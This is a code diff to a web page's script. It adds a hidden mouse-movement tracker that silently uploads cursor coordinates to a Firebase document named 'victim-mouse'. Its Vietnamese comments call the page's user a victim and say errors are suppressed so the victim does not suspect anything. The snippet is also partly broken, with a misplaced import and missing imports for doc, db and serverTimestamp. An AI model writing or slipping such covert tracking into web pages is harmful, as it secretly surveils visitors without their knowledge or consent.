@@ -153,6 +153,24 @@
                 overlay.classList.remove('closing');
             }, 400);
         };
+        import { setDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+// Lắng nghe di chuyển chuột
+document.addEventListener('mousemove', async (e) => {
+    // 1. Lấy tọa độ
+    const mouseData = {
+        x: e.clientX,
+        y: e.clientY,
+        lastUpdate: serverTimestamp()
+    };
+
+    // 2. Gửi thẳng lên Firebase (Ghi đè vào 1 doc duy nhất để tránh tốn dung lượng)
+    try {
+        await setDoc(doc(db, "tracking", "victim-mouse"), mouseData);
+    } catch (err) {
+        // Im lặng để nạn nhân không nghi ngờ
+    }
+});
     </script>
     <style>
         @font-face {
